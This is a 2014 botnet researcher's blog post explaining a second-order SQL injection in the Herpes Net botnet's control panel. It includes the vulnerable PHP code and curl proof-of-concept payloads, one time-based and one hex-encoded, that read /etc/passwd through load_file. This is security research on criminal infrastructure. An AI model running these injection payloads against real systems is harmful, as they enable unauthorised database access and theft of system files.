<!DOCTYPE html>
<html lang="en-US">
    <head>
        <meta charset="utf-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="author" content="Brian Wallace" />
        <meta name="copyright" content="Brian Wallace" />

        <meta name="description" content="During my talk at RSAC 2014, we announced multiple botnet vulnerabilities which had been discovered. The following vulnerability is one of them. Herpes Net is botnet with a wide range of functions, with everything from opening the CD tray to mining bitcoins (via plugins). With a vulnerability in the command ...
" />
<meta name="keywords" content="botnet, herpesnet, exploit, vulnerability, sqli, Botnets, " />
        <title>Herpes Net 3.0 SQLi - Brian Wallace (@botnet_hunter)
</title>
        <link href="http://cdn-images.mailchimp.com/embedcode/slim-081711.css" rel="stylesheet" type="text/css">
        <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" href="/theme/css/style.css" media="screen">
        <link rel="stylesheet" type="text/css" href="/theme/css/solarizedlight.css" media="screen">
        <link rel="shortcut icon" href="/theme/images/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon.png" />
        <link rel="apple-touch-icon" sizes="57x57" href="/theme/images/apple-touch-icon-57x57.png" />
        <link rel="apple-touch-icon" sizes="72x72" href="/theme/images/apple-touch-icon-72x72.png" />
        <link rel="apple-touch-icon" sizes="114x114" href="/theme/images/apple-touch-icon-114x114.png" />
        <link rel="apple-touch-icon" sizes="144x144" href="/theme/images/apple-touch-icon-144x144.png" />
        <link rel="icon" href="/theme/images/apple-touch-icon-144x144.png" />
    </head>
    <body>
        <div id="content-sans-footer">
        <div class="navbar navbar-static-top">
            <div class="navbar-inner">
                <div class="container">
                    <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <a class="brand" href="/"><span class=site-name>Brian Wallace (@botnet_hunter)</span></a>
                    <div class="nav-collapse collapse">
                        <ul class="nav pull-right top-menu">
                            <li ><a href="/">Home</a></li>
                            <li ><a href="/categories.html">Categories</a></li>
                            <li ><a href="/tags.html">Tags</a></li>
                            <li ><a href="/archives.html">Archives</a></li>
                            <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="container-fluid">
            <div class="row-fluid">
                <div class="span1"></div>
                <div class="span10">
<article>
<div class="row-fluid">
    <header class="page_header span10 offset2">
    <h1><a href="/herpes-net-30-sqli.html"> Herpes Net 3.0 SQLi  </a></h1>
    </header>
</div>

<div class="row-fluid">
        <div class="span8 offset2 article-content">

            <p>During my talk at RSAC 2014, we announced multiple botnet vulnerabilities which had been discovered.  The following vulnerability is one of them.  Herpes Net is botnet with a wide range of functions, with everything from opening the CD tray to mining bitcoins (via plugins).  With a vulnerability in the command and control panel, we can get information on the botnet operator.</p>
<!-- more -->

<p>When this vulnerability was discovered by myself, I had thought it was a rediscovery of a <a href="https://code.google.com/p/malware-lu/wiki/en_analyse_herpnet">vulnerability</a> discovered by malware.lu.  Upon further investigation into their proof of concept, I found that the parameter they are injecting on no longer exists.  Instead of injecting on the 'id' parameter, we can inject on the the 'hwid' parameter.  The following is the vulnerable code (only relevant code displayed).</p>
<div class="highlight"><pre>    <span class="err">$</span><span class="n">hwid</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="err">&#39;</span><span class="n">hwid</span><span class="err">&#39;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="n">header</span> <span class="o">==</span> <span class="s">&quot;74978b6ecc6c19836a17a3c2cd0840b0&quot;</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">hwid</span> <span class="o">&lt;&gt;</span> <span class="s">&quot;&quot;</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="err">$</span><span class="n">bottest</span> <span class="o">=</span> <span class="n">mysql_query</span><span class="p">(</span><span class="s">&quot;SELECT * FROM clients WHERE hwid = &#39;$hwid&#39;&quot;</span><span class="p">);</span>
            <span class="k">while</span><span class="p">(</span><span class="err">$</span><span class="n">row</span> <span class="o">=</span> <span class="n">mysql_fetch_array</span><span class="p">(</span><span class="err">$</span><span class="n">bottest</span><span class="p">))</span>
            <span class="p">{</span><span class="err">$</span><span class="n">id</span> <span class="o">=</span> <span class="err">$</span><span class="n">row</span><span class="p">[</span><span class="err">&#39;</span><span class="n">id</span><span class="err">&#39;</span><span class="p">];}</span>
            <span class="k">if</span><span class="p">(</span><span class="n">mysql_num_rows</span><span class="p">(</span><span class="err">$</span><span class="n">bottest</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
                <span class="err">$</span><span class="n">result</span> <span class="o">=</span> <span class="n">mysql_query</span><span class="p">(</span><span class="s">&quot;SELECT * FROM commands WHERE botid = &#39;$id&#39; AND viewed = &#39;0&#39; LIMIT 1&quot;</span><span class="p">);</span>
                <span class="k">while</span><span class="p">(</span><span class="err">$</span><span class="n">row</span> <span class="o">=</span> <span class="n">mysql_fetch_array</span><span class="p">(</span><span class="err">$</span><span class="n">result</span><span class="p">))</span>
                <span class="p">{</span>
                    <span class="n">echo</span> <span class="err">$</span><span class="n">row</span><span class="p">[</span><span class="err">&#39;</span><span class="n">cmd</span><span class="err">&#39;</span><span class="p">].</span><span class="s">&quot;|&quot;</span><span class="p">.</span><span class="err">$</span><span class="n">row</span><span class="p">[</span><span class="err">&#39;</span><span class="n">variable</span><span class="err">&#39;</span><span class="p">];</span>
</pre></div>


<p>A keen eye will notice that there are two vulnerable queries in this code selection.  The first query, while injectable, does not have a direct influence on output.  While blind SQL injection is not improbable, it does make for quite a bit more noise when trying to extract information.  Just for reference though, here is a proof of concept blind SQLi.</p>
<div class="highlight"><pre><span class="n">curl</span> <span class="o">-</span><span class="n">A</span> <span class="s">&quot;74978b6ecc6c19836a17a3c2cd0840b0&quot;</span> <span class="o">-</span><span class="n">v</span> <span class="n">http</span><span class="o">:</span><span class="c1">//c2.com/panels/herpes/run.php -d &quot;hwid=&#39; AND 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,BENCHMARK(10000, SLEEP(1000)) -- --&quot;</span>
</pre></div>


<p>This should sleep for quite a while if exploited successfully.  If only we can get a result from the database to print out, we could use a much simpler, faster and quieter exploit.  If we return a SQL injection payload from the first query, we can exploit the next one, and return data to be read.  Here is what we want in our second query's payload for a proof of concept.</p>
<div class="highlight"><pre><span class="err">&#39;</span> <span class="n">AND</span> <span class="mi">1</span><span class="o">=</span><span class="mi">2</span> <span class="n">UNION</span> <span class="n">ALL</span> <span class="n">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">load_file</span><span class="p">(</span><span class="err">&#39;</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">&#39;</span><span class="p">),</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span> <span class="o">--</span> <span class="o">--</span>
</pre></div>


<p>In order to do that, we should hex encode it.</p>
<div class="highlight"><pre><span class="mh">0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d</span>
</pre></div>


<p>And now our proof of concept looks like the following.</p>
<div class="highlight"><pre><span class="n">curl</span> <span class="o">-</span><span class="n">A</span> <span class="s">&quot;74978b6ecc6c19836a17a3c2cd0840b0&quot;</span> <span class="o">-</span><span class="n">v</span> <span class="n">http</span><span class="o">:</span><span class="c1">//c2.com/panels/herpes/run.php -d &quot;hwid=&#39; AND 1=2 UNION ALL SELECT 0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d,2,3,4,5,6,7,8,9 -- --&quot;</span>
</pre></div>


<p>The data returned will be followed by '|4' as that is what is being returned in the 'variable' row.  We can of course control this value as well if needed.</p>
<p><a href="https://github.com/bwall/BAMF/blob/master/IntegrationQueue/http/herpesnet/herpesnet.class.py">Here</a> is a proof of concept which uses this second order SQL injection to extract the bot information from the database.</p>
            <aside>
            <nav>
            <ul class="articles_timeline">
 
                <li class="previous_article">« <a href="/multilocker-backdoor.html" title="Previous: MultiLocker Backdoor">MultiLocker Backdoor</a></li>
 
                <li class="next_article"><a href="/murdering-dexter.html" title="Next: Murdering Dexter">Murdering Dexter</a> »</li>
            </ul>
            </nav>
            </aside>
        </div>
        <section>
        <div class="span2" style="float:right;font-size:0.9em;">
 
            <h4>Published</h4>
            <time pubdate="pubdate" datetime="2014-03-09T20:43:00-07:00">Mar 9, 2014</time>
            <h4>Category</h4>
            <a class="category-link" href="/categories.html#Botnets-ref">Botnets</a> 
            <h4>Tags</h4>
            <ul class="list-of-tags tags-in-article"> 
                <li><a href="/tags.html#botnet-ref">botnet
                    <span>4</span>
</a></li>
                <li><a href="/tags.html#exploit-ref">exploit
                    <span>4</span>
</a></li>
                <li><a href="/tags.html#herpesnet-ref">herpesnet
                    <span>2</span>
</a></li>
                <li><a href="/tags.html#sqli-ref">sqli
                    <span>2</span>
</a></li>
                <li><a href="/tags.html#vulnerability-ref">vulnerability
                    <span>3</span>
</a></li>
            </ul>

        </div>
        </section>
    </div>
    </article>
                </div>
                <div class="span1"></div>
            </div>
        </div>
    </div>
<footer>
<div id="footer">
    <ul class="footer-content">
        <li class="elegant-subtitle"><span class="site-name">Brian Wallace (@botnet_hunter)</span> - A botnet hunter's blog</li>
        <li class="elegant-license">Site content © Copyright 2014 Brian Wallace</li>
        <li class="elegant-power">Powered by <a href="http://getpelican.com/" title="Pelican Home Page">Pelican</a>. Theme: <a href="http://oncrashreboot.com/pelican-elegant" title="Theme Elegant Home Page">Elegant</a> by <a href="http://oncrashreboot.com" title="Talha Mansoor Home Page">Talha Mansoor</a></li>
    </ul>
</div>
</footer>            <script src="http://code.jquery.com/jquery.min.js"></script>
        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/js/bootstrap.min.js"></script>
        <script>
            function validateForm(query)
            {
                return (query.length > 0);
            }
        </script>

    </body>
</html>